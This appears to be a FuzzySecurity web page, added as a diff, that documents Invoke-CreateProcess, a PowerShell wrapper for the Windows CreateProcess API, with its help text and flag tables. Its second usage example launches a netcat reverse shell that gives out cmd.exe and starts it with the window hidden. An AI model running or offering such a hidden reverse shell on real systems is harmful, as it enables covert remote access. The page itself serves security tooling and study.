@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--><html lang="en"> <!--<![endif]-->
+<head>
+
+  <!-- Basic Page Needs -->
+  <meta charset="utf-8">
+  <title>FuzzySecurity | Coding: Invoke-CreateProcess</title>
+  <meta name="description" content="">
+  <meta name="author" content="">
+
+  <!-- CSS Style -->
+  <link rel="stylesheet" href="../css/style.css"> 
+  
+  <!-- Color Skins -->
+  <link rel="stylesheet" href="../css/skins/red.css" name="skins"> 
+  
+  <!-- Layout Style -->
+  <link rel="stylesheet" href="../css/layout/wide.css" name="layout"> 
+  
+  <!-- Small Icons -->
+  <link rel="stylesheet" href="../css/icons.css">  
+  
+  <!-- SyntaxHighlighter -->
+  <link type="text/css" rel="stylesheet" href="../css/shCoreEmacs.css"/>
+  
+  <!-- Start JavaScript -->
+  
+    <script src="../js/jquery-1.7.2.min.js"></script> <!-- jQuery library -->
+    <script src="../js/jquery.easing.1.3.min.js"></script> <!-- jQuery Easing --> 
+    <script src="../js/jquery-ui.min.js"></script> <!-- jQuery Ui --> 
+    <script src="../js/jquery.cookie.js"></script> <!-- jQuery cookie --> 
+    <script src="../js/jquery.uniform.min.js"></script> <!-- jQuery Uniform -->
+    <script src="../js/ddsmoothmenu.js"></script> <!-- Nav Menu ddsmoothmenu -->
+    <script src="../js/jquery.flexslider.js"></script> <!-- Flex Slider  -->
+    <script src="../js/jquery.eislideshow.js"></script> <!-- Elastic Slider  -->
+    <script src="../js/jquery.iconmenu.js"></script> <!-- Sliding Text and Icon Menu Style  -->
+    <script src="../js/colortip.js"></script> <!-- Colortip Tooltip Plugin  -->
+    <script src="../js/tytabs.js"></script> <!-- jQuery Plugin tytabs  -->
+    <script src="../js/carousel.js"></script> <!-- jQuery Carousel  -->
+    <script src="../js/jquery.prettyPhoto.js"></script> <!-- jQuery Prettyphoto  -->
+    <script src="../js/jquery.isotope.min.js"></script> <!-- Isotope Filtering  -->
+    <script src="../js/selectnav.js"></script> <!-- Responsive Navigation Menu by SelectNav -->
+    <script src="../js/jquery.ui.totop.js"></script> <!-- UItoTop plugin  -->
+    <script src="../js/custom.js"></script> <!-- Custom Js file for javascript in html -->
+	
+    <!-- SyntaxHighlighter -->
+	<script type="text/javascript" src="../js/shCore.js"></script>
+	<script type="text/javascript" src="../js/shBrushPhp.js"></script>
+    <script type="text/javascript">SyntaxHighlighter.all();</script>
+  
+  <!-- End JavaScript -->
+
+  <!--[if lt IE 9]>
+      <script src="js/html5.js"></script>
+  <![endif]-->
+
+  <!-- Favicons -->
+  <link rel="shortcut icon" href="../images/favicon/favicon.ico">
+  <link rel="apple-touch-icon" href="../images/favicon/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="72x72" href="../images/favicon/apple-touch-icon-72x72.png">
+  <link rel="apple-touch-icon" sizes="114x114" href="../images/favicon/apple-touch-icon-114x114.png">
+
+</head>
+<body>
+
+  <div id="wrap" class="boxed">
+
+  <header>
+    <div class="container clearfix">
+    
+      <div class="five columns">
+        <div class="logo">
+        <a href="index.html">
+          <img src="../images/logo.png" alt="FuzzySec" />
+        </a>
+        </div>
+      </div><!-- End Logo -->
+      
+      <div class="eleven columns">
+        <nav id="menu" class="navigation">
+          <ul id="nav">
+            <li><a href="../index.html">Home</a>
+            </li>
+            <li><a href="../tutorials.html">Tutorials</a>
+            </li>
+            <li><a href="../coding.html" class="active">Scripting</a>
+            </li>
+            <li><a href="../exploits.html">Exploits</a>
+            </li>
+            <li><a href="../links.html">Links</a>
+            </li>
+            <li><a href="../patreon.html">Patreon</a></li><li><a href="../contact.html">Contact</a></li>
+          </ul> 
+        </nav>
+      </div><!-- End Menu -->
+      
+      
+      <div class="sixteen columns"><hr /></div>
+      
+    </div><!-- End Container -->
+  </header><!-- <<< End Header >>> -->
+  
+  <div class="container clearfix">
+  
+    <div class="page-columns">
+    
+    <ul class="breadcrumbs">
+      <li><a href="index.html"><span class="icon home gray"></span></a></li>
+          <li><a href="../index.html">Home</a> <b>&#187;</b></li>
+          <li><a href="../coding.html">Scripting</a> <b>&#187;</b></li>
+          <li>Invoke-CreateProcess</li>
+      </ul>
+      
+      <!-- section 16 Columns -->
+      
+      <div class="recent-work gallery clearfix">
+      <div class="fourteen columns bottom">
+	<div style="height:20px;" align="right">
+		<link type="text/css" rel="stylesheet" href="https://www.fuzzysecurity.com/css/patreon.css"/>
+		<button class="btn btn-2 btn-2g"><a href="https://www.patreon.com/FuzzySec" target="_blank"><img src="https://c5.patreon.com/external/logo/become_a_patron_button.png" style="border-radius: 10px;height:40px;"></a></button>
+	</div>
+        <h2 class="title">Invoke-CreateProcess<span class="line"></span></h2>
+        <p>Invoke-CreateProcess is a PowerShell wrapper for Kernel32 CreateProcess. For full details you can read the associated post on accessing the Windows API from PowerShell <a href="../tutorials/24.html">here</a>.</p><br /><br />
+
+<strong><font color=#ffffff>[Get-Help]</font></strong><br /><br />
+
+<div class="terminal_wrap" style="background:#CCC">
+<pre><span style='color:#ff0000;'>PS C:\Users\Fubar\Desktop</span>> <span style='color:#2B8156;'>. .\Invoke-CreateProcess.ps1</span>
+<span style='color:#ff0000;'>PS C:\Users\Fubar\Desktop</span>> <span style='color:#2B8156;'>Get-Help Invoke-CreateProcess -Full</span>
+
+NAME
+    Invoke-CreateProcess
+
+SYNOPSIS
+    -Binary            Full path of the module to be executed.
+
+    -Args              Arguments to pass to the module, e.g. "/c calc.exe". Defaults
+                       to $null if not specified.
+
+    -CreationFlags     Process creation flags:
+                         0x00000000 (NONE)
+                         0x00000001 (DEBUG_PROCESS)
+                         0x00000002 (DEBUG_ONLY_THIS_PROCESS)
+                         0x00000004 (CREATE_SUSPENDED)
+                         0x00000008 (DETACHED_PROCESS)
+                         0x00000010 (CREATE_NEW_CONSOLE)
+                         0x00000200 (CREATE_NEW_PROCESS_GROUP)
+                         0x00000400 (CREATE_UNICODE_ENVIRONMENT)
+                         0x00000800 (CREATE_SEPARATE_WOW_VDM)
+                         0x00001000 (CREATE_SHARED_WOW_VDM)
+                         0x00040000 (CREATE_PROTECTED_PROCESS)
+                         0x00080000 (EXTENDED_STARTUPINFO_PRESENT)
+                         0x01000000 (CREATE_BREAKAWAY_FROM_JOB)
+                         0x02000000 (CREATE_PRESERVE_CODE_AUTHZ_LEVEL)
+                         0x04000000 (CREATE_DEFAULT_ERROR_MODE)
+                         0x08000000 (CREATE_NO_WINDOW)
+
+    -ShowWindow        Window display flags:
+                         0x0000 (SW_HIDE)
+                         0x0001 (SW_SHOWNORMAL)
+                         0x0001 (SW_NORMAL)
+                         0x0002 (SW_SHOWMINIMIZED)
+                         0x0003 (SW_SHOWMAXIMIZED)
+                         0x0003 (SW_MAXIMIZE)
+                         0x0004 (SW_SHOWNOACTIVATE)
+                         0x0005 (SW_SHOW)
+                         0x0006 (SW_MINIMIZE)
+                         0x0007 (SW_SHOWMINNOACTIVE)
+                         0x0008 (SW_SHOWNA)
+                         0x0009 (SW_RESTORE)
+                         0x000A (SW_SHOWDEFAULT)
+                         0x000B (SW_FORCEMINIMIZE)
+                         0x000B (SW_MAX)
+
+    -StartF            Bitfield to influence window creation:
+                         0x00000001 (STARTF_USESHOWWINDOW)
+                         0x00000002 (STARTF_USESIZE)
+                         0x00000004 (STARTF_USEPOSITION)
+                         0x00000008 (STARTF_USECOUNTCHARS)
+                         0x00000010 (STARTF_USEFILLATTRIBUTE)
+                         0x00000020 (STARTF_RUNFULLSCREEN)
+                         0x00000040 (STARTF_FORCEONFEEDBACK)
+                         0x00000080 (STARTF_FORCEOFFFEEDBACK)
+                         0x00000100 (STARTF_USESTDHANDLES)
+
+SYNTAX
+    Invoke-CreateProcess [-Binary] &lt;String> [[-Args] &lt;String>] [-CreationFlags] &lt;Int32> [-ShowWindow]
+    &lt;Int32> [-StartF] &lt;Int32> [&lt;CommonParameters>]
+
+
+DESCRIPTION
+    Author: Ruben Boonen (@FuzzySec)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+
+PARAMETERS
+    -Binary &lt;String>
+
+        Required?                    true
+        Position?                    1
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    -Args &lt;String>
+
+        Required?                    false
+        Position?                    2
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    -CreationFlags &lt;Int32>
+
+        Required?                    true
+        Position?                    3
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    -ShowWindow &lt;Int32>
+
+        Required?                    true
+        Position?                    4
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    -StartF &lt;Int32>
+
+        Required?                    true
+        Position?                    5
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?
+
+    &lt;CommonParameters>
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer and OutVariable. For more information, type,
+        "get-help about_commonparameters".
+
+INPUTS
+
+OUTPUTS
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW
+
+    C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1
+           -StartF 0x1
+
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
+
+    C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e
+           C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1</pre>
+</div><p>&nbsp;</p>
+
+        <p>Download: <a href="files/Invoke-CreateProcess.rar">Invoke-CreateProcess.ps1</a></p>
+        
+      </div>
+      <!-- End  -->
+    	</div>    
+    </div><!-- End page-columns -->
+     
+         <div align="center"><script>
+           var idcomments_acct = '77033bd2b8799fdea5c0f689f55f6e1e';
+           var idcomments_post_id;
+           var idcomments_post_url;
+           </script>
+             <span id="IDCommentsPostTitle" style="display:none"></span>
+           <script type='text/javascript' src='http://www.intensedebate.com/js/genericCommentWrapperV2.js'></script>
+         </div>
+     
+  </div><!-- <<< End Container >>> -->
+  
+  <footer>
+    <div class="container">
+    
+      
+      <div class="six columns"><span class="copyright">
+      © Copyright <a href="../index.html">FuzzySecurity</a></span></div>
+      
+      <div class="six columns">
+        
+          <p><a href="../index.html">Home</a> |
+          <a href="../tutorials.html">Tutorials</a> |
+          <a href="../coding.html">Scripting</a> |
+          <a href="../exploits.html">Exploits</a> |
+          <a href="../links.html">Links</a> |
+          <a href="../contact.html">Contact</a></p>
+        
+      </div>
+    
+    </div><!-- End container -->
+  </footer><!-- <<< End Footer >>> -->
+  
+  </div><!-- End wrap -->
+  
+  <!-- Start Style Switcher -->
+  <div class="switcher"></div>
+  <!-- End Style Switcher -->
+    
+</body>
+</html>
